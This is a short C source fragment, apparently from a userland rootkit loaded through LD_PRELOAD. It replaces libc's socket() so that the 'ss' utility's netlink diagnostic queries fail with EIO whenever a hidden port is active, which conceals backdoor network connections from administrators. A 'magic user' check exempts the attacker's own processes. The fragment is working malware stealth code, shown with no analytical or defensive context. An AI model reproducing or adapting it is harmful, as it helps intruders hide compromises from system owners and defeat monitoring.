int ssme(int domain, int protocol){
    if(domain != AF_NETLINK || protocol != NETLINK_INET_DIAG)
        return 0;

    if(cmp_process("ss\0")) return 1;
    if(cmp_process("/usr/bin/ss\0")) return 1;
    if(cmp_process("/bin/ss\0")) return 1;
    return 0;
}

int socket(int domain, int type, int protocol){
    if(magicusr()) goto o_socket;

    if(ssme(domain, protocol)){
        if(!hideport_alive())  /* don't break ss if there's no need to */
            goto o_socket;

        errno = EIO;
        return -1;
    }

o_socket:
    hook(CSOCKET);
    return (long)call(CSOCKET, domain, type, protocol);
}